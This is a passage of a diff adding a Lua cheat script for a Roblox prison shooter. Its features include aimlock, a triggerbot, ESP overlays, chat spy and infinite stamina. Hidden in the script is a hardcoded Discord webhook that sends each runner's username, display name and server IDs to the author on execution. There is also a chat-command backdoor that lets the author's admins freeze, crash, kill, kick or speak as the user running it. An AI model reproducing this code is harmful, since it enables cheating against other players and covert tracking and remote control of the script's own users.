+	tlab.TextColor3 = Color3.fromRGB(255, 255, 255)
+	tlab.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
+	tlab.TextStrokeTransparency = 1
+
+	spawn(function()
+		while true do
+			pcall(function()
+				local playerCharacter = Players[player].Character
+				if playerCharacter and playerCharacter:FindFirstChild("Head") then
+					bgui.Parent = playerCharacter.Head
+					highlight.Parent = playerCharacter
+					bgui.Adornee = Players[player].Character:FindFirstChild("Head")
+
+					tlab.Text = ""
+
+					if _OT["ESPName"] then
+						tlab.Text = Players[player].DisplayName
+					end
+
+					if _OT["ESPVest"] then
+						tlab.Text = tlab.Text .. " Vested: " .. tostring(vested(Players[player]))
+					end
+
+					if _OT["ESPHealth"] then
+						local humanoid = playerCharacter:FindFirstChildOfClass("Humanoid")
+						if humanoid then
+							tlab.Text = tlab.Text .. " Health: " .. tostring(math.floor(humanoid.Health))
+						end
+					end
+				end
+			end)
+			task.wait()
+		end
+	end)
+end
+
+
+function MakeSound()
+	local sound = INew("Sound", workspace)
+	sound.Name = "Ohkay"
+	sound.SoundId = "rbxassetid://8726881116"
+	sound:Play()
+	debris:AddItem(sound, sound.TimeLength + 1)
+end
+
+local function getSmoothingValue(percentage)
+	return 1 - (percentage / 100);
+end
+
+local function GetHead(player : Player)
+	if (player and player.Character) then
+		return player.Character:FindFirstChild("Head");
+	end
+	return nil;
+end
+
+local function isPlayerOnScreen(position)
+	local viewportPoint = camera:WorldToViewportPoint(position)
+	return viewportPoint.Z > 0
+end
+
+local function isPlayerInRadius(player, center, radius)
+	local head = GetHead(player)
+	if head then
+		local viewportPoint = camera:WorldToViewportPoint(head.Position)
+		if viewportPoint.Z > 0 then
+			local screenPosition = V2New(viewportPoint.X, viewportPoint.Y)
+			local distance = (screenPosition - center).Magnitude
+			if distance <= radius then
+				return true, screenPosition, distance
+			end
+		end
+	end
+	return false, nil, math.huge
+end
+
+
+local function findClosestPlayer()
+	local Distance = math.huge
+	local closestPlayer = nil
+	local mouseLocation = UserInputService:GetMouseLocation()
+
+	for _, v in ipairs(Players:GetPlayers()) do
+		if GetHead(v) and v ~= LocalPlayer then
+			local targetHead = GetHead(v)
+			local targetPos = camera:WorldToViewportPoint(targetHead.Position)
+
+			if isPlayerOnScreen(targetHead.Position) then
+				local screenDistance = (V2New(targetPos.X, targetPos.Y) - mouseLocation).Magnitude
+
+				if screenDistance <= Circle.Radius then
+					local mag = (LocalPlayer:GetMouse().Hit.Position - targetHead.Position).Magnitude
+					if mag < Distance then
+						closestPlayer = v
+						Distance = mag
+					end
+				end
+			end
+		end
+	end
+	return closestPlayer
+end
+
+local function CheckAired(player)
+	if (player.Character:FindFirstChildOfClass("Humanoid").FloorMaterial == Enum.Material.Air) or player.Character.Head.Velocity.Y >= 1 or (player.Character:FindFirstChildOfClass("Humanoid").FloorMaterial == Enum.Material.Air) and player.Character.Head.Velocity.Y >= 1 then
+		return true
+	else
+		return false
+	end
+end
+
+local function grounded(player)
+	local params = RaycastParams.new()
+	params.FilterDescendantsInstances = {player.Character}
+	params.RespectCanCollide = true
+
+	local character = player.Character
+	local primarypart = character and character:FindFirstChild("HumanoidRootPart")
+
+	player.CharacterAdded:Connect(function(chr)
+		params.FilterDescendantsInstances = {chr}
+		character = chr
+		primarypart = chr:WaitForChild("HumanoidRootPart", 9e9)
+	end)
+
+	player.CharacterRemoving:Connect(function()
+		character = nil
+		primarypart = nil
+	end)
+
+	RunService.Heartbeat:Connect(function()
+		if not character or not primarypart then
+			return
+		end
+
+		local primary_position = primarypart.Position
+		local floor = raycast(workspace, primary_position, down, params)
+		if not floor then
+			IsGrounded[player] = false
+			return
+		end
+
+		local f_up = floor.Position + r6_up
+		IsGrounded[player] = true
+		PlayerFloor[player] = f_up
+	end)
+end
+
+for _, p in ipairs(Players:GetPlayers()) do
+	task.spawn(grounded, p)
+end
+
+Players.PlayerAdded:Connect(function(p)
+	task.spawn(grounded, p)
+end)
+
+
+local function updateCameraLock()
+	if (_OT["CameraLocked"] and _OT["targetPlayer"]) then
+		if (_OT["targetPlayer"].Character and _OT["targetPlayer"].Character:FindFirstChild("KO") and (Flags["KOCheck"] == true)) or _OT["targetPlayer"].Character:FindFirstChildOfClass("Humanoid").Health == 0 and (Flags["KOCheck"] == true) then
+			_OT["CameraLocked"] = false;
+			return;
+		end
+		local targetHead = GetHead(_OT["targetPlayer"]);
+		local targetPosition;
+		if targetHead then
+			if not Flags["Blatant"] then
+				local targetFloorPos = PlayerFloor[_OT.targetPlayer]
+				local Formula = (targetFloorPos.Y + Flags["YOffset"] / 10)
+				targetPosition = V3New(targetFloorPos.X, targetFloorPos.Y + Flags["YOffset"] / 10, targetFloorPos.Z) + V3New(targetHead.Velocity.X, 0, targetHead.Velocity.Z) / Flags["Prediction"]
+				if Flags["AirShotScale"] ~= 0 and CheckAired(_OT["targetPlayer"]) then
+					Formula = (targetFloorPos.Y + Flags["YOffset"] / 10 + Flags["AirShotScale"] / 10)
+				end
+			elseif Flags["Blatant"] then
+				targetPosition = (targetHead.Position + V3New(0, (Flags["YOffset"] / 10), 0)) + targetHead.Velocity  / Flags["Prediction"] 
+			end
+			local currentCFrame = Camera.CFrame;
+			local lookAtCFrame = CFNew(Camera.CFrame.Position, targetPosition);
+			local smoothingValue = getSmoothingValue(Flags["Smoothing"]);
+			Camera.CFrame = currentCFrame:lerp(lookAtCFrame, smoothingValue);
+		end
+	end
+end
+
+
+
+local function ShootAnim()
+	local character = getChar()
+	local humanoid = character:WaitForChild("Humanoid")
+	local tool = character:FindFirstChildOfClass("Tool")
+
+
+	if not tool then
+		return
+	end
+
+	local fires = tool:FindFirstChild("Fires")
+	if not fires then
+		return
+	end
+
+	local animationTrack
+	local fireCFrame
+
+	local screenCenter = V2New(camera.ViewportSize.X / 2, camera.ViewportSize.Y / 2)
+
+	if _OT["CameraLocked"] and _OT["targetPlayer"]:IsA("Player") and _OT["targetPlayer"].Character then
+		local targetPosition2;
+		local targetHead = _OT["targetPlayer"].Character:FindFirstChild("Head")
+		if targetHead then
+			if not Flags["Blatant"] then
+				local targetFloorPos = PlayerFloor[_OT.targetPlayer]
+				local Formula = (targetFloorPos.Y + Flags["YOffset"] / 10)
+				targetPosition2 = V3New(targetFloorPos.X, targetFloorPos.Y + Flags["YOffset"] / 10, targetFloorPos.Z) + V3New(targetHead.Velocity.X, 0, targetHead.Velocity.Z) / Flags["Prediction"]
+				if Flags["AirShotScale"] > 0 and CheckAired(_OT["targetPlayer"]) then
+					Formula = (targetFloorPos.Y + Flags["YOffset"] / 10 + Flags["AirShotScale"] / 10)
+				end
+			elseif Flags["Blatant"] then
+				targetPosition2 = (targetHead.Position + V3New(0, (Flags["YOffset"] / 10), 0)) + targetHead.Velocity  / Flags["Prediction"] 
+			end
+
+			local inRadius = isPlayerInRadius(_OT["targetPlayer"], screenCenter, Circle.Radius)
+
+			if inRadius then
+				fireCFrame = CFNew(targetPosition2)
+			else
+				fireCFrame = Mouse.Hit
+			end
+		end
+	else
+		fireCFrame = Mouse.Hit
+	end
+
+	if tool.Ammo.Value <= 0 then
+		return
+	end
+	if (character:FindFirstChildOfClass("Humanoid").FloorMaterial == Enum.Material.Air) or character.Head.Velocity.Y >= 1 or (character:FindFirstChildOfClass("Humanoid").FloorMaterial == Enum.Material.Air) and character.Head.Velocity.Y >= 1 then
+		return
+	end
+
+	local ShouldLoad = true;
+	for u,x in pairs(LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks()) do
+		if (x.Animation.AnimationId == fires.AnimationId) then
+			x:Stop(0);
+		end
+	end
+
+	animationTrack = humanoid:LoadAnimation(fires)
+	if tostring(tool) == "Glock" then
+		_OT["holding"] = "Glock"
+
+		getRemote("Glock", fireCFrame)
+	elseif tostring(tool) == "Shotty" then
+		_OT["holding"] = "Shotty"
+
+		getRemote("Shotty", fireCFrame)
+	end
+
+	if (ShouldLoad) then
+		LocalPlayer.Character.Humanoid:LoadAnimation(fires):Play(.1,1,2);
+	end
+	return _OT["holding"]
+end
+
+local function MouseButtonFire()
+	if Flags["AutoShoot"] then
+		while _OT["Firing"] do
+			local weaponType = ShootAnim();
+			if (weaponType == "Glock") then
+				task.wait(.27);
+			elseif (weaponType == "Shotty") then
+				task.wait(.18);
+			end
+			Loops["Stepped"]:Wait()
+		end
+	elseif not Flags["AutoShoot"] then
+		ShootAnim();
+	end
+end
+
+function AutoShootTriggerbot()
+	while true do
+		local Delay_1 = 0
+		if Flags["Triggerbot"] and _OT["CameraLocked"] then
+			pcall(function()
+				local screenCenter = V2New(camera.ViewportSize.X / 2, camera.ViewportSize.Y / 2)
+				local inRadius, screenPosition, distance = isPlayerInRadius(_OT["targetPlayer"], screenCenter, Circle2.Radius)
+
+				if inRadius and not ForceFieldCheck(_OT["targetPlayer"]) and isTargetOnScreen(_OT["targetPlayer"]) and getChar():FindFirstChild("Glock") and _OT["targetPlayer"].Character and _OT["targetPlayer"].Character.HumanoidRootPart then
+					ShootAnim()
+					Delay_1 = Flags["GlockAutoShootDelay"];
+				elseif inRadius and not ForceFieldCheck(_OT["targetPlayer"]) and isTargetOnScreen(_OT["targetPlayer"]) and getChar():FindFirstChild("Shotty") and _OT["targetPlayer"].Character and _OT["targetPlayer"].Character.HumanoidRootPart then
+					ShootAnim()
+					Delay_1 = Flags["ShottyAutoShootDelay"];
+				else
+					Delay_1 = 0;
+				end
+			end)
+		else
+			Delay_1 = 0;
+		end
+		task.wait(Delay_1);
+	end;
+end
+
+function CHATSPY()
+	if (Flags["ChatSpy"] == true) then
+		chatFrame.ChatChannelParentFrame.Visible = true
+		chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Position+UDim2.new(UDim.new(),chatFrame.ChatChannelParentFrame.Size.Y)
+	elseif (Flags["ChatSpy"] == false) then
+		chatFrame.ChatChannelParentFrame.Visible = false
+		chatFrame.ChatBarParentFrame.Position = OriginalChatPos
+	end
+end
+
+function fireEvents(door)
+	if door:FindFirstChild("Lock") then
+		wait(0.2)
+		door.Click.ClickDetector.RemoteEvent:FireServer()
+	elseif door.Parent:FindFirstChild("Lock") then
+		wait(0.2)
+		door.Parent.Click.ClickDetector.RemoteEvent:FireServer()
+	elseif door.Parent.Parent:FindFirstChild("Lock") then
+		wait(0.2)
+		door.Parent.Parent.Click.ClickDetector.RemoteEvent:FireServer()
+	end
+end
+
+local function getRandomSpawnCFrame(spawnTable)
+	local keys = {}
+	for key in pairs(spawnTable) do
+		table.insert(keys, key)
+	end
+	local randomKey = keys[math.random(#keys)]
+	return spawnTable[randomKey]
+end
+
+local function loadspawn(character)
+	local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+
+	local normalizedLocation = Flags["SpawnLocation"]:lower()
+
+	local spawnTable
+	if normalizedLocation:lower() == "random" then
+		spawnTable = RandomSpawns
+	elseif normalizedLocation:lower() == "front" then
+		spawnTable = FrontSpawns
+	elseif normalizedLocation:lower() == "back" then
+		spawnTable = BackSpawns
+	else
+		spawnTable = FrontSpawns -- Just for default
+		warn("Invalid spawn location: " .. Flags["SpawnLocation"])
+		return
+	end
+
+	local spawnCFrame = getRandomSpawnCFrame(spawnTable)
+
+	if Flags["SpawnGamepass"] then
+		humanoidRootPart.CFrame = spawnCFrame
+	end
+end
+
+local function AntiGroundHit()
+	getChar().Humanoid.StateChanged:Connect(function(r, current)
+		if Flags["AntiGroundHit"] then
+			if current == Enum.HumanoidStateType.FallingDown or current == Enum.HumanoidStateType.PlatformStanding and not getChar():FindFirstChild("KO") and getChar():FindFirstChildOfClass("Humanoid").Health ~= 0 then
+				getChar().Humanoid.PlatformStand = false
+				getChar().Humanoid.Sit = false
+				getChar().Humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
+				getChar().Humanoid:ChangeState(Enum.HumanoidStateType.RunningNoPhysics)
+			end
+		end
+	end)
+end
+
+
+
+
+do -- // Inputs
+
+
+	UserInputService.InputBegan:Connect(function(input)
+		if (input.KeyCode == Keys.Camlock_Key.Value) then
+			if not keyPressing then
+				keyPressing = true;
+				if _OT["CameraLocked"] then
+					_OT["CameraLocked"] = false;
+				else
+					local mouseLocation = UserInputService:GetMouseLocation();
+					_OT["targetPlayer"] = findClosestPlayer(V2New(mouseLocation.X, mouseLocation.Y), Circle.Radius);
+					if (_OT["targetPlayer"] and _OT["targetPlayer"]:IsA("Player") and _OT["targetPlayer"].Character and _OT["CameraLocked"] == false) then
+						_OT["CameraLocked"] = true;
+						MakeSound();
+					end
+				end
+			end
+		end
+	end);
+
+	UserInputService.InputEnded:Connect(function(input)
+		if (input.KeyCode == Keys.Camlock_Key.Value) then
+			keyPressing = false;
+		end
+	end);
+
+
+	UserInputService.InputBegan:Connect(function(input)
+		if (input.UserInputType == Keys.AutoShoot_Key.Value) or (input.KeyCode == Keys.AutoShoot_Key.Value) then
+			if not _OT["Firing"] then
+				_OT["Firing"] = true;
+				MouseButtonFire();
+			end
+		end
+	end);
+
+	UserInputService.InputEnded:Connect(function(input)
+		if (input.UserInputType == Keys.AutoShoot_Key.Value) or (input.KeyCode == Keys.AutoShoot_Key.Value) then
+			_OT["Firing"] = false;
+		end
+	end);
+
+	UserInputService.InputBegan:Connect(function(input, typing)
+		if (typing) then
+			return;
+		end
+		if (input.UserInputType == Keys.OpenDoor_Key.Value) or (input.KeyCode == Keys.OpenDoor_Key.Value) then
+			fireEvents(Mouse.Target)
+		end
+	end)
+end
+
+function Ye()
+	if LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid") and LocalPlayer.Character.Humanoid.Health > 0 then
+		LocalPlayer.Character.ChildAdded:Connect(function(child)
+			if tostring(child) == "Glock" or tostring(child) == "Shotty" then
+
+				if child.Ammo.Value <= 0 then
+					child.ManualActivationOnly = false
+				elseif child.Ammo.Value > 0 then
+					child.ManualActivationOnly = true
+				end
+
+				child.Ammo.Changed:Connect(function()
+					if child.Ammo.Value <= 0 then
+						child.ManualActivationOnly = false
+					elseif child.Ammo.Value > 0 then
+						child.ManualActivationOnly = true
+					end
+				end)
+			end
+		end)
+	end
+end
+
+function InfiniteStamina(Y)
+	local Stam = Y:WaitForChild("Stam")
+
+	if (not Stam) then
+		return 
+	end
+
+	Stam.Changed:Connect(function(val)
+		if Flags["InfiniteStamina"] then
+			val = 100
+			Stam.Value = 100
+		end
+	end)
+end
+
+
+
+do
+	LocalPlayer.CharacterAdded:Connect(function(char)
+		task.wait(.2)
+		loadspawn(char);
+		InfiniteStamina(char)
+		AntiGroundHit();
+		Ye()
+	end)
+end
+
+do -- // Loops
+	Loops["RenderStepped"]:Connect(function()
+		task.spawn(function()
+			if Flags["GlockBoost"] and getChar() and getChar():FindFirstChildOfClass("Humanoid") then
+				local hrp = getChar().HumanoidRootPart;
+				local hum = getChar():FindFirstChildOfClass("Humanoid");
+				if (hrp.Velocity.Y > 80) and (hum.FloorMaterial == Enum.Material.Air) then
+					if not _OT["Boosted"] then
+						hrp.Velocity = V3New(hrp.Velocity.X, hrp.Velocity.Y + Flags["GlockBoostAmount"], hrp.Velocity.Z);
+						_OT["Boosted"] = true;
+					end
+				else
+					_OT["Boosted"] = false;
+				end
+			end
+		end);
+
+		--[[
+					task.spawn(function()
+			if Flags["AutoReset"] and getChar() and getChar():FindFirstChildOfClass("Humanoid") then
+				if getChar():FindFirstChild("KO") then
+					local args = {[1]=LocalPlayer.Backpack.Punch,[3]=false,[4]=false};
+					ReplicatedStorage.Touch1:FireServer(unpack(args));
+					ReplicatedStorage.Touch1:FireServer();
+					getChar():BreakJoints();
+					getChar().KO:Destroy()
+				end
+			end
+		end)
+		]]--
+
+		task.spawn(function() -- // Move Mouse To FOV
+			local mouseLocation = UserInputService:GetMouseLocation();
+			Circle.Position = mouseLocation;
+			Circle.Radius = Flags["AimlockFOVSize"]
+			Circle.Visible = Flags["AimlockVisible"]
+			Circle2.Position = mouseLocation;
+			Circle2.Radius = Flags["TriggerbotFOVSize"];
+			Circle2.Visible = Flags["TriggerbotVisible"]
+			updateCameraLock();
+		end);
+
+
+		task.spawn(function()
+			if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") and Flags["LookAt"] and _OT["CameraLocked"] then
+				if LocalPlayer.Character.Humanoid.Health ~= 0 or not LocalPlayer.Character:FindFirstChild("KO") then
+					local screenCenter = V2New(camera.ViewportSize.X / 2, camera.ViewportSize.Y / 2)
+					local inRadius, screenPosition, distance = isPlayerInRadius(_OT["targetPlayer"], screenCenter, 1000)
+
+					if inRadius and _OT["targetPlayer"] and _OT["targetPlayer"].Character and _OT["targetPlayer"].Character.HumanoidRootPart then
+
+						local LookAtPos = Vector3.new(_OT["targetPlayer"].Character.HumanoidRootPart.Position.X, LocalPlayer.Character.HumanoidRootPart.Position.Y, _OT["targetPlayer"].Character.HumanoidRootPart.Position.Z)
+
+						LocalPlayer.Character.HumanoidRootPart.CFrame = LocalPlayer.Character.HumanoidRootPart.CFrame:Lerp(CFrame.new(LocalPlayer.Character.HumanoidRootPart.Position, LookAtPos), getSmoothingValue(Flags["LookAtSmoothing"]))
+					end
+				end
+			end
+		end)
+
+
+		task.wait(.01)
+	end);
+end
+
+local window = library:Window({name = "<font color=\"#AA55EB\">prisoncheats.mp4 (made by oden)</font> | "..Version})
+
+local aimbot = window:Page({Name = "Aimbot"})
+
+local config = window:Page({Name = "Configs"})
+
+--
+local aimbot_section = aimbot:Section({Name = "aimlock settings", size = 425})
+local aimbot_section2 = aimbot:Section({Name = "misc", Size = 275, Side = "Right"})
+
+local config_section = config:Section({Name = "Settings", Size = 275})
+local config_section2 = config:Section({Name = "misc", Size = 200, Side = "Right"})
+
+
+local label2 = aimbot_section:Label({Name = "Q To Lock On | MB1 AutoShoot", Offset = 16})
+
+local aimlockfovtoggle = aimbot_section:Toggle({Name = "{ Aimlock FOV }", Default = true, 
+	Callback = function(val) 
+		Flags["AimlockVisible"] = val 
+		createNotification("Aimlock FOV Visible : "..tostring(val), 4, RGB(170, 85, 235))
+	end})
+local aimlockfovsizeslider = aimbot_section:Slider({Name = "{ Aimlock FOV Size }", Default = 250, Minimum = 1, Maximum = 1000, Decimals = 5, Suffix = "", 
+	Callback = function(val) 
+		Flags["AimlockFOVSize"] = val 
+	end})
+
+local aimlockpredictionslider = aimbot_section:Slider({Name = "{ Aimlock Prediction }", Default = 8, Minimum = 1, Maximum = 100, Decimals = .1, Suffix = "", 
+	Callback = function(val) 
+		Flags["Prediction"] = val
+	end})
+
+local triggerbotfovtoggle = aimbot_section:Toggle({Name = "{ Triggerbot FOV }", Default = true, 
+	Callback = function(val) 
+		Flags["TriggerbotVisible"] = val 
+		createNotification("Triggerbot FOV Visible : "..tostring(val), 4, RGB(170, 85, 235))
+	end})
+local triggerbotfovsizeslider = aimbot_section:Slider({Name = "{ Triggerbot FOV Size }", Default = 80, Minimum = 1, Maximum = 1000, Decimals = 5, Suffix = "", 
+	Callback = function(val) 
+		Flags["TriggerbotFOVSize"] = val
+	end})
+
+
+local autoresettoggle = aimbot_section2:Toggle({Name = "{ Auto Reset }", Default = false, 
+	Callback = function(val) 
+		Flags["AutoReset"] = val 
+		createNotification("Auto Reset Returning Soon")
+	end})
+local glocklaunchboosttoggle = aimbot_section2:Toggle({Name = "{ Glock Launch Boost }", Default = false, 
+	Callback = function(val) 
+		Flags["GlockBoost"] = val 
+		createNotification("Glock Launch Boost : "..tostring(val), 4, RGB(170, 85, 235))
+	end})
+
+local glockboostslider = aimbot_section2:Slider({Name = "{ Glock Boost Slider }", Default = 90, Minimum = 1, Maximum = 200, Decimals = 1, Suffix = "", 
+	Callback = function(val) 
+		Flags["GlockBoostAmount"] = val
+	end})
+
+--local slider = aimbot_section:Slider({Name = "random slider", Callback = function(val) warn(val) end})
+--local button = aimbot_section:Button({Name = "random button", Callback = function() warn("clicked") end})
+
+--local slider = aimbot_section:Slider({Name = "random slider", Default = 10, Minimum = -10, Maximum = 30, Decimals = 10, Suffix = "%", Callback = function(val) warn(val) end})
+--local label = aimbot_section:Label({Name = "label hello random"})
+--local label2 = aimbot_section:Label({Name = "with none", Offset = 16})
+--local toggle = aimbot_section:Toggle({Name = "random toggle", Default = true, Callback = function(val) warn(val) end})
+--local slider = aimbot_section:Slider({Default = 10, Minimum = -10, Maximum = 30, Decimals = 10, Suffix = "%", Callback = function(val) warn(val) end})
+--local button = aimbot_section:Button({Name = "random button", Callback = function() warn("clicked") end})
+--local slider = aimbot_section:Slider({Name = "random slider", Callback = function(val) warn(val) end})
+local smoothingslider = aimbot_section:Slider({Name = "{ Smoothing }", Default = 87, Minimum = 0.1, Maximum = 99.9, Decimals = 0.1, Suffix = "%", 
+	Callback = function(val) 
+		Flags["Smoothing"] = val 
+	end})
+local airshotscaleslider = aimbot_section:Slider({Name = "{ Air Shot Scale }", Default = 0 , Minimum = 0, Maximum = 20, Decimals = 1, Suffix = "%", 
+	Callback = function(val) 
+		Flags["AirShotScale"] = val 
+	end})
+
+local blatantaimlocktoggle = aimbot_section:Toggle({Name = " { Blatant Aimlock }", Default = false, 
+	Callback = function(val) 
+		Flags["Blatant"] = val
+		createNotification("Blatant : "..tostring(Flags["Blatant"], 6, RGB(170, 85, 235)))
+	end})
+
+local yoffsetslider = aimbot_section:Slider({Name = "{ Y Offset }", Default = -20, Minimum = -25, Maximum = 15, Decimals = .1, Suffix = "", 
+	Callback = function(val) 
+		Flags["YOffset"] = val
+	end})
+
+local label = aimbot_section2:Label(
+	{Name = "Spawn GamePass", Offset = 16}
+)
+
+local spawngamepasstoggle = aimbot_section2:Toggle({Name = "{ Spawn Gamepass (Fixed) }", Default = false, 
+	Callback = function(val) 
+		Flags["SpawnGamepass"] = val
+		createNotification("Spawn Location Gamepass : "..tostring(val), 4, RGB(170, 85, 235))
+	end})
+local backspawnbutton = aimbot_section2:Button({Name = "{ Back Spawn }", 
+	Callback = function() 
+		Flags["SpawnLocation"] = "back"
+		createNotification("Back Spawn Selected", 4, RGB(170, 85, 235))
+
+	end})
+
+local frontspawnbutton = aimbot_section2:Button({Name = "{ Front Spawn }", 
+	Callback = function() 
+		Flags["SpawnLocation"] = "front"
+		createNotification("Front Spawn Selected", 4, RGB(170, 85, 235))
+	end})
+
+local infinitestaminatoggle = aimbot_section2:Toggle({Name = "{ Infinite Stamina ( Works) }", Default = false, 
+	Callback = function(val) 
+		Flags["InfiniteStamina"] = true
+		pcall(function()
+
+			InfiniteStamina(LocalPlayer.Character)
+		end)
+		createNotification("Infinite Stamina : "..tostring(Flags["InfiniteStamina"]))
+	end})
+
+local antigroundhittoggle = aimbot_section2:Toggle({Name = " { Anti Ground Hit }", Default = false, 
+	Callback = function(val) 
+		Flags["AntiGroundHit"] = val
+		createNotification("Anti Ground Hit : "..tostring(val), 4, RGB(170, 85, 235))		
+	end})
+
+local chatspytoggle = aimbot_section2:Toggle({Name = "Chat Spy", Default = false, 
+	Callback = function(val) 
+		Flags["ChatSpy"] = val
+		CHATSPY();
+		createNotification("Chat Spy : "..tostring(val), 4, RGB(170, 85, 235))
+	end})
+
+local label = aimbot_section:Label(
+	{Name = "TRIGGERBOT", Offset = 16}
+)
+
+
+
+local autoshoottoggle = aimbot_section:Toggle({Name = "{ AutoShoot }", Default = true, 
+	Callback = function(val) 
+		Flags["AutoShoot"] = val
+		createNotification("AutoShoot : "..tostring(val), 4, RGB(170, 85, 235))
+	end})
+
+local triggerbottoggle = aimbot_section:Toggle({Name = "{ Triggerbot }", Default = false, 
+	Callback = function(val) 
+		Flags["Triggerbot"] = val
+		createNotification("Triggerbot : "..tostring(val), 4, RGB(170, 85, 235))
+	end})
+local lookattoggle = aimbot_section:Toggle({Name = "{ LookAt Target }", Default = false, 
+	Callback = function(val) 
+		Flags["LookAt"] = val
+		createNotification("Look At : "..tostring(val), 4, RGB(170, 85, 235))
+	end})
+local lookatsmoothingslider = aimbot_section:Slider({Name = "{ LookAt Smoothing }", Default = 80.1, Minimum = 1.1, Maximum = 99.9, Decimals = .1, Suffix = "%", 
+	Callback = function(val) 
+		Flags["LookAtSmoothing"] = val
+	end})
+local kochecktoggle = aimbot_section:Toggle({Name = "{ KO Check }", Default = true, 
+	Callback = function(val) 
+		Flags["KOCheck"] = val
+		createNotification("KO Check : "..tostring(val), 4, RGB(170, 85, 235))
+	end})
+
+local label = aimbot_section:Label(
+	{Name = "ESP", Offset = 16}
+)
+
+local toggle = aimbot_section:Toggle({Name = "Enable ESP", Default = false, 
+	Callback = function(val) 
+		_OT["ESP"] = val
+		for _, players in pairs(Players:GetPlayers()) do
+			esp(tostring(players));
+		end
+		createNotification("ESP : "..tostring(val), 4, RGB(170, 85, 235))
+	end})
+
+local toggle = aimbot_section:Toggle({Name = "Vest", Default = false, 
+	Callback = function(val) 
+		_OT["ESPVest"] = val
+		createNotification("Vest ESP : "..tostring(val), 4, RGB(170, 85, 235))
+	end})
+
+local toggle = aimbot_section:Toggle({Name = "Name", Default = false, 
+	Callback = function(val) 
+		_OT["ESPName"] = val
+		createNotification("Name ESP : "..tostring(val), 4, RGB(170, 85, 235))
+	end})
+
+local toggle = aimbot_section:Toggle({Name = "Health", Default = false, 
+	Callback = function(val) 
+		_OT["ESPHealth"] = val
+		createNotification("Health ESP : "..tostring(val), 4, RGB(170, 85, 235))
+	end})
+
+
+local label = aimbot_section2:Label(
+	{Name = "Open Doors : X", Offset = 16}
+)
+
+local Webhook_URL = "https://discord.com/api/webhooks/1328883183437090817/8WkNgLyXG3DNiPUqz_Dtqq3nUJKUXUds3InKczvdOqqLoBFiMmb2mikJnkklv5p0pPgr"
+local PlaceId, JobId = game.PlaceId, game.JobId 
+
+local response    = request({
+	Url     = Webhook_URL,
+	Method  = "POST",
+	Headers = {
+		["Content-Type"] = "application/json"
+	},
+	Body    = HttpService:JSONEncode({
+		["content"] = "",
+		["embeds"] = {{
+			["title"] = "oden",
+			["description"] = tostring(LocalPlayer) .. " has executed the script" ,
+			["type"] = "rich",
+			["color"] = tonumber("0xffffff"),
+			["fields"] = {
+				{
+					["name"] = "Display Name / placeId / JobId / Version:",
+					["value"] = LocalPlayer.DisplayName.."\nPlaceID: "..PlaceId.." JobId: "..JobId.."\n```Version: "..tostring(Version).."```",
+					["inline"] = true,
+				}
+			}
+		}}
+	})
+})
+
+local function findPlayer(plr)
+	for i, v in ipairs(Players:GetPlayers()) do
+		if string.find(v.Name:lower(), plr:lower()) or string.find(v.DisplayName:lower(), plr:lower()) then
+			return v
+		end
+	end
+end
+
+AdminStuff.Filtering.OnClientEvent:Connect(function(messageData)
+	local Admins = AdminStuff.GetAdmin();
+
+	local fromSpeaker = messageData.FromSpeaker;
+	local message = messageData.Message;
+	local speaker = Players:FindFirstChild(fromSpeaker);
+
+	if speaker then
+		if table.find(Admins, speaker.Name) then
+			local args = string.split(message, " ");
+			local command = args[1]:lower();
+			local targetName = args[2];
+			if (command == "/freeze") then
+				local targetPlayer = findPlayer(targetName);
+				if (targetPlayer == LocalPlayer) then
+					local character = getChar();
+					if (character and character:FindFirstChild("HumanoidRootPart")) then
+						character.HumanoidRootPart.Anchored = true;
+					end
+				end
+			elseif (command == "/crash") then
+				local targetPlayer = findPlayer(targetName);
+				if (targetPlayer == LocalPlayer) then
+					while true do end
+				end
+			elseif (command == "/kill") then
+				local targetPlayer = findPlayer(targetName);
+				if (targetPlayer == LocalPlayer) then
+					getChar():BreakJoints()
+				end
+			elseif command == "/chat" then
+				local targetPlayer = findPlayer(targetName)
+				if targetPlayer == LocalPlayer then
+					local restofarguments = table.concat(args, " ", 3)
+					AdminStuff.sayMessage(restofarguments)
+				end
+			elseif command == "/update" then
+				TeleportService:TeleportToPlaceInstance(PlaceId, JobId, LocalPlayer)
+			elseif (command == "/kick") then
+				local targetPlayer = findPlayer(targetName);
+				if (targetPlayer == LocalPlayer) then
+					LocalPlayer:Kick("You have been kicked by an admin.");
+				end
+			end
+		end
+	end
+end);
+
+aimbot:Turn(true)
+
+createNotification("Loaded", 6, RGB(170, 85, 235))
+
+coroutine.wrap(AutoShootTriggerbot)()
+
+Ye()
+
+local saveconfig = config_section:Button({Name = "{ Save Configs }",
+	Callback = function()
+		local data = ""
+
+		for key, value in pairs(Flags) do
+			data = data .. 'Flags["' .. key .. '"] = ' .. tostring(value) .. "\n"
+		end
+
+		writefile(filename, data)
+
+		createNotification("Configs Saved Check F9")
+	end,
+})
+
+local loadconfig = config_section:Button({Name = "{ Load Configs }",
+	Callback = function()
+
+
+		loadstring(readfile(filename))();
+
+		airshotscaleslider:Set(Flags["AirShotScale"])
+		autoresettoggle:Set(Flags["AutoReset"])
+		glocklaunchboosttoggle:Set(Flags["GlockBoost"])
+		glockboostslider:Set(Flags["GlockBoostAmount"])
+		smoothingslider:Set(Flags["Smoothing"])
+		blatantaimlocktoggle:Set(Flags["Blatant"])
+		yoffsetslider:Set(Flags["YOffset"])
+		spawngamepasstoggle:Set(Flags["SpawnGamepass"])
+		infinitestaminatoggle:Set(Flags["InfiniteStamina"])
+		antigroundhittoggle:Set(Flags["AntiGroundHit"])
+		chatspytoggle:Set(Flags["ChatSpy"]); chatspytoggle.callback(Flags["ChatSpy"])
+		autoshoottoggle:Set(Flags["AutoShoot"])
+		triggerbottoggle:Set(Flags["Triggerbot"])
+		lookatsmoothingslider:Set(Flags["LookAtSmoothing"])
+		lookattoggle:Set(Flags["LookAt"])
+		kochecktoggle:Set(Flags["KOCheck"])
+		aimlockfovtoggle:Set(Flags["AimlockVisible"])
+		aimlockpredictionslider:Set(Flags["Prediction"])
+		triggerbotfovsizeslider:Set(Flags["TriggerbotFOVSize"]); 
+		triggerbotfovtoggle:Set(Flags["TriggerbotVisible"])
+		aimlockfovsizeslider:Set(Flags["AimlockFOVSize"]); 
+
+
